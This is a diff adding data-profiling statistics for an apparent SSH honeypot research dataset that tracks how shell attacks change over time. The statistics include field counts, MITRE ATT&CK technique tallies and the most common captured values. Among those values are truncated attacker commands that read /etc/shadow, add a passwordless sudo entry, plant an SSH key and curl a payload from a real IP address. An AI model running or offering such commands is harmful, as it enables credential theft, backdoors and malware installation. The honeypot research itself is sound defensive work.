+      [
+       "cat /proc/cpuinfo | grep name | wc -l",
+       22
+      ],
+      [
+       "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+       22
+      ],
+      [
+       "w",
+       22
+      ],
+      [
+       "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+       21
+      ],
+      [
+       "ls -lh $(which ls)",
+       21
+      ],
+      [
+       "which ls",
+       21
+      ],
+      [
+       "crontab -l",
+       21
+      ]
+     ]
+    },
+    "response": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "root@ubuntu:~# cat /proc/cpuinfo | grep name | wc -l\n24\nroot@ubuntu:~#",
+       22
+      ],
+      [
+       "root@ubuntu:~# cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,",
+       22
+      ],
+      [
+       "root@ubuntu:~# which ls\n/bin/ls\nroot@ubuntu:~#",
+       21
+      ],
+      [
+       "root@ubuntu:~# free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'\n7259383",
+       20
+      ],
+      [
+       "root@ubuntu:~# ls -lh $(which ls)\n-rwxr-xr-x 1 root root 129K Jan 18  2023 /bin/",
+       20
+      ],
+      [
+       "root@ubuntu:~# uname -m\nx86_64\nroot@ubuntu:~#",
+       20
+      ],
+      [
+       "root@ubuntu:~# cat /proc/cpuinfo | grep model | grep name | wc -l\n24\nroot@ubuntu",
+       17
+      ],
+      [
+       "root@ubuntu:~# uname\nLinux\nroot@ubuntu:~#",
+       15
+      ]
+     ]
+    },
+    "system_change": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "The content, which is the ASCII representation of the hexadecimal values provide",
+       241
+      ],
+      [
+       "No changes to the system.",
+       203
+      ],
+      [
+       "No changes to the system were made.",
+       74
+      ],
+      [
+       "None",
+       27
+      ],
+      [
+       "No changes to the system were made by this command.",
+       25
+      ],
+      [
+       "\n- A new string was appended to the 'ddnsclient' file.\n- The string 'ECHODONE' w",
+       21
+      ],
+      [
+       "\n- The 'ddnsclient' file in the '/sys' directory was appended with new binary co",
+       19
+      ],
+      [
+       "No changes were made to the system.",
+       15
+      ]
+     ]
+    },
+    "severity_vi": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": 5,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2",
+       669
+      ],
+      [
+       "0",
+       591
+      ],
+      [
+       "4",
+       123
+      ],
+      [
+       "3",
+       71
+      ],
+      [
+       "1",
+       35
+      ]
+     ]
+    },
+    "response_source": {
+     "filled": 1489,
+     "seen": 1489,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "curated_ubuntu",
+       1489
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/commands/#.jsonl": {
+   "files": 1,
+   "bytes": 1075654,
+   "lines": 4236,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 4236,
+   "parsed": 4236,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/commands/2024.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "command": {
+     "filled": 4236,
+     "seen": 4236,
+     "distinct": null,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "uname -a;id;cat /etc/shadow /etc/passwd;lscpu;echo 'daemon ALL=(ALL) NOPASSWD: A",
+       2
+      ],
+      [
+       "nohup $SHELL -c \"curl http://8.218.230.152:60116/linux -o /tmp/mkK47vJW2R; if [ ",
+       2
+      ],
+      [
+       "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+       1
+      ],
+      [
+       "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAr",
+       1
+      ],
+      [
+       "uname -a",
+       1
+      ],
+      [
+       "shell",
+       1
+      ],
+      [
+       "sh",
+       1
+      ],
+      [
+       "enable",
+       1
+      ]
+     ]
+    },
+    "period": {
+     "filled": 4236,
+     "seen": 4236,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024",
+       4236
+      ]
+     ]
+    },
+    "frequency": {
+     "filled": 4236,
+     "seen": 4236,
+     "distinct": 43,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "1",
+       4105
+      ],
+      [
+       "2",
+       34
+      ],
+      [
+       "3",
+       23
+      ],
+      [
+       "12",
+       15
+      ],
+      [
+       "5",
+       9
+      ],
+      [
+       "734",
+       3
+      ],
+      [
+       "731",
+       3
+      ],
+      [
+       "7",
+       3
+      ]
+     ]
+    },
+    "is_complex": {
+     "filled": 4236,
+     "seen": 4236,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "True",
+       3491
+      ],
+      [
+       "False",
+       745
+      ]
+     ]
+    },
+    "command_pattern": {
+     "filled": 3491,
+     "seen": 4236,
+     "distinct": 94,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "echo | chpasswd | bash",
+       1272
+      ],
+      [
+       "cat ; /bin/busybox",
+       572
+      ],
+      [
+       "cd ; cat || cp ; /bin/busybox",
+       572
+      ],
+      [
+       "tftp ; wget ; /bin/busybox",
+       572
+      ],
+      [
+       "nohup $SHELL -c -o ; if if [ ! -f ] ; then wget -O ; fi ; if if [ ! -f ] ; then ",
+       173
+      ],
+      [
+       "head -c >",
+       111
+      ],
+      [
+       "chmod +x ./ ; nohup ./ &",
+       45
+      ],
+      [
+       "/bin/busybox echo -en >> && /bin/busybox echo -en",
+       42
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/raw_samples/cowrie_ssh_#_sample.jsonl": {
+   "files": 1,
+   "bytes": 96788,
+   "lines": 300,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 300,
+   "parsed": 300,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/raw_samples/cowrie_ssh_2024_sample.jsonl",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {
+    "info": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 6,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "session.closed",
+       60
+      ],
+      [
+       "session.connect",
+       60
+      ],
+      [
+       "command.input",
+       57
+      ],
+      [
+       "session.kex",
+       46
+      ],
+      [
+       "userlogin",
+       46
+      ],
+      [
+       "session.loseConnection",
+       31
+      ]
+     ]
+    },
+    "alert": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 3,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Initial Access",
+       197
+      ],
+      [
+       "Execution",
+       57
+      ],
+      [
+       "Credential Access",
+       46
+      ]
+     ]
+    },
+    "tshark": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 111,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Timeout reached in HoneyPotSSHTransport",
+       61
+      ],
+      [
+       "SSH client hassh fingerprint: f555226df1963d1d3c09daf865abdc9a",
+       44
+      ],
+      [
+       "[SERVER] - Disconnecting with error, code11  reason: b'Bye Bye'",
+       31
+      ],
+      [
+       "INPUT_COMD: cd ~; chattr -ia .ssh; lockr -ia .ssh",
+       13
+      ],
+      [
+       "INPUT_COMD: cat /proc/cpuinfo | grep name | wc -l",
+       10
+      ],
+      [
+       "OUTPUT: ERRORnot enough values to unpack (expected 3, got 1)",
+       10
+      ],
+      [
+       "OUTPUT: chattr: command not found\nlockr: command not found\nroot@ubuntu:~# ",
+       8
+      ],
+      [
+       "login attempt [b'345gs5662d34'/b'345gs5662d34'] failed",
+       7
+      ]
+     ]
+    },
+    "src_host": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 6,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "209.38.229.174",
+       183
+      ],
+      [
+       "43.156.90.187",
+       106
+      ],
+      [
+       "221.159.44.18",
+       6
+      ],
+      [
+       "198.235.24.54",
+       2
+      ],
+      [
+       "85.209.11.227",
+       2
+      ],
+      [
+       "35.237.74.174",
+       1
+      ]
+     ]
+    },
+    "src_port": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 62,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "49536",
+       12
+      ],
+      [
+       "54218",
+       12
+      ],
+      [
+       "54994",
+       12
+      ],
+      [
+       "45848",
+       12
+      ],
+      [
+       "60014",
+       11
+      ],
+      [
+       "60266",
+       10
+      ],
+      [
+       "45066",
+       10
+      ],
+      [
+       "40412",
+       9
+      ]
+     ]
+    },
+    "dst_host": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "64.31.55.123",
+       300
+      ]
+     ]
+    },
+    "dst_port": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "22",
+       300
+      ]
+     ]
+    },
+    "protocol": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "ssh",
+       300
+      ]
+     ]
+    },
+    "pot_id": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 1,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "ssh",
+       300
+      ]
+     ]
+    },
+    "request": {
+     "filled": 0,
+     "seen": 300,
+     "distinct": 0,
+     "with_attack_ids": 0,
+     "top": []
+    },
+    "timestamp": {
+     "filled": 300,
+     "seen": 300,
+     "distinct": 300,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024-01-23 00:00:04.933043",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.935366",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.937237",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.938192",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.939067",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.939920",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.943949",
+       1
+      ],
+      [
+       "2024-01-23 00:00:04.944591",
+       1
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#d_extract_responses.py": {
+   "files": 1,
+   "bytes": 89422,
+   "lines": 355,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/06d_extract_responses.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#d_extract_responses.py": {
+   "files": 1,
+   "bytes": 89372,
+   "lines": 355,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/06d_extract_responses.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#a_map_attack_techniques.py": {
+   "files": 1,
+   "bytes": 74626,
+   "lines": 800,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/07a_map_attack_techniques.py",
+   "note": "",
+   "techniques": {
+    "T1059": 140,
+    "T1105": 86,
+    "T1222": 85,
+    "T1070": 81,
+    "T1083": 63,
+    "T1082": 44,
+    "T1027": 41,
+    "T1098": 22,
+    "T1005": 13,
+    "T1489": 11,
+    "T1036": 11,
+    "T1087": 10,
+    "T1424": 7,
+    "T1057": 6,
+    "T1655": 6,
+    "T1564": 6,
+    "T1053": 5,
+    "T1071": 5,
+    "T1016": 4,
+    "T1518": 4,
+    "T1548": 3,
+    "T1124": 3,
+    "T1120": 3,
+    "T1590": 3,
+    "T1531": 2,
+    "T1474": 2,
+    "T1037": 1,
+    "T1069": 1,
+    "T1003": 1,
+    "T1562": 1,
+    "T1033": 1
+   },
+   "technique_mentions_per_file": "min 671, median 671, max 671",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#a_map_attack_techniques.py": {
+   "files": 1,
+   "bytes": 52125,
+   "lines": 696,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/07a_map_attack_techniques.py",
+   "note": "",
+   "techniques": {
+    "T1059": 91,
+    "T1105": 59,
+    "T1222": 57,
+    "T1083": 51,
+    "T1070": 51,
+    "T1027": 31,
+    "T1082": 25,
+    "T1098": 14,
+    "T1087": 12,
+    "T1036": 10,
+    "T1005": 9,
+    "T1424": 9,
+    "T1489": 7,
+    "T1655": 6,
+    "T1124": 6,
+    "T1016": 4,
+    "T1518": 4,
+    "T1057": 3,
+    "T1053": 3,
+    "T1531": 3,
+    "T1548": 3,
+    "T1564": 3,
+    "T1120": 3,
+    "T1474": 2,
+    "T1037": 1
+   },
+   "technique_mentions_per_file": "min 467, median 467, max 467",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#a_map_attack_techniques_v#.py": {
+   "files": 1,
+   "bytes": 50199,
+   "lines": 567,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/07a_map_attack_techniques_v0.py",
+   "note": "",
+   "techniques": {
+    "T1059": 92,
+    "T1105": 58,
+    "T1222": 56,
+    "T1083": 53,
+    "T1070": 45,
+    "T1027": 33,
+    "T1082": 24,
+    "T1531": 13,
+    "T1087": 12,
+    "T1424": 9,
+    "T1005": 8,
+    "T1489": 7,
+    "T1655": 7,
+    "T1124": 5,
+    "T1016": 4,
+    "T1053": 4,
+    "T1098": 4,
+    "T1518": 4,
+    "T1057": 3,
+    "T1548": 3,
+    "T1120": 3,
+    "T1474": 2,
+    "T1037": 1
+   },
+   "technique_mentions_per_file": "min 450, median 450, max 450",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/compare/compare_#_behavior.py": {
+   "files": 1,
+   "bytes": 16940,
+   "lines": 154,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/compare/compare_03_behavior.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/scripts/build_dataset.py": {
+   "files": 1,
+   "bytes": 15350,
+   "lines": 369,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/scripts/build_dataset.py",
+   "note": "",
+   "techniques": {
+    "T1098": 2,
+    "T1053": 2,
+    "T1082": 1,
+    "T1083": 1,
+    "T1087": 1,
+    "T1424": 1,
+    "T1033": 1,
+    "T1016": 1,
+    "T1518": 1,
+    "T1069": 1,
+    "T1124": 1,
+    "T1614": 1,
+    "T1005": 1,
+    "T1105": 1,
+    "T1071": 1,
+    "T1003": 1,
+    "T1222": 1,
+    "T1070": 1,
+    "T1655": 1,
+    "T1562": 1,
+    "T1027": 1,
+    "T1564": 1,
+    "T1036": 1,
+    "T1548": 1,
+    "T1059": 1,
+    "T1489": 1,
+    "T1496": 1,
+    "T1531": 1,
+    "T1547": 1
+   },
+   "technique_mentions_per_file": "min 31, median 31, max 31",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/README.md": {
+   "files": 1,
+   "bytes": 12499,
+   "lines": 264,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/README.md",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/README.md": {
+   "files": 1,
+   "bytes": 10302,
+   "lines": 215,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/README.md",
+   "note": "",
+   "techniques": {
+    "T1070": 2,
+    "T1222": 2,
+    "T1082": 2,
+    "T1562": 1,
+    "T1003": 1,
+    "T1098": 1
+   },
+   "technique_mentions_per_file": "min 9, median 9, max 9",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/derived_session_coverage_techniques.jsonl": {
+   "files": 1,
+   "bytes": 8355,
+   "lines": 49,
+   "kind": "jsonl",
+   "binary": 0,
+   "rows": 49,
+   "parsed": 49,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/dataset/attack_ttp/derived_session_coverage_techniques.jsonl",
+   "note": "",
+   "techniques": {
+    "T1082": 6,
+    "T1059": 4,
+    "T1083": 4,
+    "T1005": 4,
+    "T1087": 4,
+    "T1098": 4,
+    "T1222": 4,
+    "T1053": 4,
+    "T1057": 4,
+    "T1105": 4,
+    "T1070": 4,
+    "T1036": 4,
+    "T1027": 4,
+    "T1548": 4,
+    "T1016": 4,
+    "T1424": 4,
+    "T1489": 4,
+    "T1564": 4,
+    "T1037": 2,
+    "T1124": 2,
+    "T1655": 2,
+    "T1531": 2,
+    "T1518": 2,
+    "T1120": 2,
+    "T1562": 2,
+    "T1003": 2,
+    "T1069": 2,
+    "T1590": 2,
+    "T1071": 2,
+    "T1033": 2
+   },
+   "technique_mentions_per_file": "min 98, median 98, max 98",
+   "fields": {
+    "period": {
+     "filled": 49,
+     "seen": 49,
+     "distinct": 2,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "2024",
+       25
+      ],
+      [
+       "2021_2022",
+       24
+      ]
+     ]
+    },
+    "technique_id": {
+     "filled": 49,
+     "seen": 49,
+     "distinct": 31,
+     "with_attack_ids": 49,
+     "top": [
+      [
+       "T1059",
+       2
+      ],
+      [
+       "T1083",
+       2
+      ],
+      [
+       "T1082",
+       2
+      ],
+      [
+       "T1005",
+       2
+      ],
+      [
+       "T1087",
+       2
+      ],
+      [
+       "T1098",
+       2
+      ],
+      [
+       "T1222",
+       2
+      ],
+      [
+       "T1053",
+       2
+      ]
+     ]
+    },
+    "technique": {
+     "filled": 49,
+     "seen": 49,
+     "distinct": 31,
+     "with_attack_ids": 49,
+     "top": [
+      [
+       "T1059 Command and Scripting Interpreter",
+       2
+      ],
+      [
+       "T1083 File and Directory Discovery",
+       2
+      ],
+      [
+       "T1082 System Information Discovery",
+       2
+      ],
+      [
+       "T1005 Data from Local System",
+       2
+      ],
+      [
+       "T1087 Account Discovery",
+       2
+      ],
+      [
+       "T1098 Account Manipulation",
+       2
+      ],
+      [
+       "T1222 File and Directory Permissions Modification",
+       2
+      ],
+      [
+       "T1053 Scheduled Task/Job",
+       2
+      ]
+     ]
+    },
+    "tactics": {
+     "filled": 49,
+     "seen": 49,
+     "distinct": 10,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "Discovery",
+       14
+      ],
+      [
+       "Defense Evasion",
+       12
+      ],
+      [
+       "Unmapped",
+       6
+      ],
+      [
+       "Persistence; Privilege Escalation",
+       4
+      ],
+      [
+       "Command and Control",
+       3
+      ],
+      [
+       "Impact",
+       3
+      ],
+      [
+       "Execution",
+       2
+      ],
+      [
+       "Collection",
+       2
+      ]
+     ]
+    },
+    "session_count": {
+     "filled": 49,
+     "seen": 49,
+     "distinct": 40,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "3",
+       4
+      ],
+      [
+       "2",
+       4
+      ],
+      [
+       "7",
+       3
+      ],
+      [
+       "1",
+       2
+      ],
+      [
+       "5240",
+       1
+      ],
+      [
+       "4241",
+       1
+      ],
+      [
+       "4007",
+       1
+      ],
+      [
+       "3972",
+       1
+      ]
+     ]
+    },
+    "session_share": {
+     "filled": 49,
+     "seen": 49,
+     "distinct": 43,
+     "with_attack_ids": 0,
+     "top": [
+      [
+       "0.000559",
+       3
+      ],
+      [
+       "0.001051",
+       3
+      ],
+      [
+       "0.000373",
+       2
+      ],
+      [
+       "0.0003",
+       2
+      ],
+      [
+       "0.976701",
+       1
+      ],
+      [
+       "0.790494",
+       1
+      ],
+      [
+       "0.746878",
+       1
+      ],
+      [
+       "0.740354",
+       1
+      ]
+     ]
+    }
+   }
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_cluster_sessions.py": {
+   "files": 1,
+   "bytes": 7063,
+   "lines": 151,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/05_cluster_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_complex_command_patterns.py": {
+   "files": 1,
+   "bytes": 6262,
+   "lines": 156,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/04_complex_command_patterns.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_cluster_sessions.py": {
+   "files": 1,
+   "bytes": 5704,
+   "lines": 139,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/05_cluster_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_complex_command_patterns.py": {
+   "files": 1,
+   "bytes": 5627,
+   "lines": 141,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/04_complex_command_patterns.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/scripts/build_paper_tables.py": {
+   "files": 1,
+   "bytes": 5075,
+   "lines": 101,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/scripts/build_paper_tables.py",
+   "note": "",
+   "techniques": {
+    "T1016": 1,
+    "T1033": 1,
+    "T1069": 1,
+    "T1082": 1,
+    "T1083": 1,
+    "T1087": 1,
+    "T1124": 1,
+    "T1424": 1,
+    "T1518": 1,
+    "T1614": 1,
+    "T1005": 1,
+    "T1071": 1,
+    "T1105": 1,
+    "T1003": 1,
+    "T1059": 1,
+    "T1053": 1,
+    "T1098": 1,
+    "T1547": 1,
+    "T1548": 1,
+    "T1027": 1,
+    "T1070": 1,
+    "T1222": 1,
+    "T1562": 1,
+    "T1564": 1,
+    "T1655": 1,
+    "T1489": 1,
+    "T1496": 1
+   },
+   "technique_mentions_per_file": "min 27, median 27, max 27",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#b_build_download_replacement.py": {
+   "files": 1,
+   "bytes": 4646,
+   "lines": 108,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/06b_build_download_replacement.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#b_build_download_replacement.py": {
+   "files": 1,
+   "bytes": 4627,
+   "lines": 108,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/06b_build_download_replacement.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/common/command_pattern.py": {
+   "files": 1,
+   "bytes": 4543,
+   "lines": 100,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/common/command_pattern.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/command_pattern.py": {
+   "files": 1,
+   "bytes": 4218,
+   "lines": 94,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/command_pattern.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_command_pattern_helper.py": {
+   "files": 1,
+   "bytes": 4130,
+   "lines": 93,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/08_command_pattern_helper.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_classify_commands.py": {
+   "files": 1,
+   "bytes": 3996,
+   "lines": 114,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/03_classify_commands.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/docs/findings.md": {
+   "files": 1,
+   "bytes": 3976,
+   "lines": 87,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/docs/findings.md",
+   "note": "",
+   "techniques": {
+    "T1070": 2,
+    "T1222": 2,
+    "T1082": 2,
+    "T1098": 2,
+    "T1562": 1,
+    "T1003": 1,
+    "T1087": 1
+   },
+   "technique_mentions_per_file": "min 11, median 11, max 11",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#/#_session_length_compare.py": {
+   "files": 1,
+   "bytes": 3882,
+   "lines": 97,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2024/08_session_length_compare.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_classify_commands.py": {
+   "files": 1,
+   "bytes": 3803,
+   "lines": 108,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/03_classify_commands.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
+  "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_#_#/#_extract_sessions.py": {
+   "files": 1,
+   "bytes": 3629,
+   "lines": 90,
+   "kind": "text",
+   "binary": 0,
+   "rows": 0,
+   "parsed": 0,
+   "ragged": 0,
+   "example": "shell-attack-evolution-dataset-main.zip::shell-attack-evolution-dataset-main/analysis/period_2021_2022/01_extract_sessions.py",
+   "note": "",
+   "techniques": {},
+   "technique_mentions_per_file": "none",
+   "fields": {}
+  },
